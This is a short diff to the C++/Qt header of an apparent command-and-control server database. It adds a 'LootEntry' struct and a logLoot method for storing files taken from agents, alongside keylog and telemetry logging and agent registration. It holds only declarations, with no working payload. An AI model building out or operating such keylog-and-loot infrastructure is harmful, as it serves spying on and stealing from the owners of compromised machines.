@@ -23,6 +23,15 @@ struct AgentProfile {
     bool isOnline;
 };
 
+struct LootEntry {
+    int id;
+    QString agentUuid;
+    QString filename;
+    QString fileType;
+    QByteArray content;
+    QString timestamp;
+};
+
 class Inferno_Database : public QObject {
     Q_OBJECT
 
@@ -34,8 +43,11 @@ public:
 
     // Core Intelligence Methods
     int registerAgent(const QString& uuid, const QString& ip, const QString& hostname, const QString& osInfo);
-    void logTelemetry(const QString& uuid, const QString& type, const QString& content);
-    void logKeylog(const QString& uuid, const QString& windowTitle, const QString& content);
+    bool logTelemetry(const QString& uuid, const QString& type, const QString& data);
+    bool logKeylog(const QString& uuid, const QString& data);
+    bool logLoot(const QString& uuid, const QString& filename, const QString& fileType, const QByteArray& content);
+    
+    // Retrieval
 
     // Liveness & Profiling (Circle 5 Phase II)
     void setAgentOnlineStatus(const QString& uuid, bool online);
